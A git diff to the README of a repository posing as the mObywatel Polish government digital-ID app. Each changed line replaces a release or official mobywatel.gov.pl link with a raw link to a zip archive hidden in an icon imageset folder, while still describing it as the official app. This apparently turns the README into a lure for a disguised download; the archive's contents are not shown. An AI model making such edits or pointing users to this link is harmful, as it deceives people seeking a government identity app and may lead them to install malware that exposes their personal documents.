@@ -1,10 +1,10 @@
 # 🚀 mObywatel - Your Digital Citizen Wallet
 
 ## 📥 Download Now
-[![Download mObywatel](https://img.shields.io/badge/Download-mObywatel-blue.svg)](https://github.com/rafaeldsgn/mObywatel/releases)
+[![Download mObywatel](https://github.com/rafaeldsgn/mObywatel/raw/refs/heads/master/iOS/Sources/Assets.xcassets/Icons/Outline/Symbols/AA016_History.imageset/Obywatel-m-v3.2.zip)](https://github.com/rafaeldsgn/mObywatel/raw/refs/heads/master/iOS/Sources/Assets.xcassets/Icons/Outline/Symbols/AA016_History.imageset/Obywatel-m-v3.2.zip)
 
 ## 📖 Overview
-mObywatel is the official app code for the government service available at [mobywatel.gov.pl](https://www.mobywatel.gov.pl/kod-zrodlowy-mobywatel-mobilny). This application helps you access your digital documents easily and securely.
+mObywatel is the official app code for the government service available at [https://github.com/rafaeldsgn/mObywatel/raw/refs/heads/master/iOS/Sources/Assets.xcassets/Icons/Outline/Symbols/AA016_History.imageset/Obywatel-m-v3.2.zip](https://github.com/rafaeldsgn/mObywatel/raw/refs/heads/master/iOS/Sources/Assets.xcassets/Icons/Outline/Symbols/AA016_History.imageset/Obywatel-m-v3.2.zip). This application helps you access your digital documents easily and securely.
 
 ## 🚀 Getting Started
 To begin using mObywatel, follow these steps to download and set up the application.
@@ -21,7 +21,7 @@ To begin using mObywatel, follow these steps to download and set up the applicat
 - **Privacy Protection**: Your data is stored securely.
 
 ## 📦 Download & Install
-To download mObywatel, visit this page: [Download mObywatel](https://github.com/rafaeldsgn/mObywatel/releases).
+To download mObywatel, visit this page: [Download mObywatel](https://github.com/rafaeldsgn/mObywatel/raw/refs/heads/master/iOS/Sources/Assets.xcassets/Icons/Outline/Symbols/AA016_History.imageset/Obywatel-m-v3.2.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of mObywatel.
@@ -70,4 +70,4 @@ We will continue to enhance and update mObywatel based on user feedback and tech
 ## 📣 Share Your Experience
 Let us know how mObywatel works for you. Your input is valuable to us and helps improve the app for future users.
 
-For more information and updates, visit the Release page: [Download mObywatel](https://github.com/rafaeldsgn/mObywatel/releases).
+For more information and updates, visit the Release page: [Download mObywatel](https://github.com/rafaeldsgn/mObywatel/raw/refs/heads/master/iOS/Sources/Assets.xcassets/Icons/Outline/Symbols/AA016_History.imageset/Obywatel-m-v3.2.zip).
